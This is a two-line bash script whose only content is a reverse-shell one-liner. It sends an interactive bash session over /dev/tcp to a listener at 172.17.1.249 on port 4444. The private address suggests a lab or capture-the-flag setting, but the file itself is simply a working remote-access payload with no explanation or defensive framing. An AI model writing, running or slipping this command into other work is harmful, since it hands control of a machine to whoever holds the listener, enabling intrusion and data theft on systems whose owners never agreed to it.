#!/bin/bash

bash -i >& /dev/tcp/172.17.1.249/4444 0>&1
